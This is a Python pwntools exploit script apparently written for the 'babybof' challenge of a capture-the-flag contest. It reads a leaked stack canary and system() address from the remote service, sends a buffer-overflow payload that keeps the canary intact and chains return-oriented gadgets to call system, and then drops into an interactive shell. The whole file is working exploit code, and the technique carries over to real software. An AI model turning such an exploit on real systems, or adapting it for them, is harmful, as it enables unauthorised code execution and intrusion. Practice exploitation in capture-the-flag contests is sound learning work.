#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './vuln_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc babybof.chal.imaginaryctf.org 1337'.split()

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    libc = ELF('')
    ld = ELF('')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

p = start()

system = eval(p.recvline_contains(b'system').split()[-1])
canary = eval(p.recvline_contains(b'canary').split()[-1])

log.info(f'canary: {canary:#x}')

payload = flat(
    b'A' * 56,
    canary,
    b'A' * 8,
    0x4011bb,
    0x4011ba,
    0x404038,
    system,
)

p.sendline(payload)
p.interactive()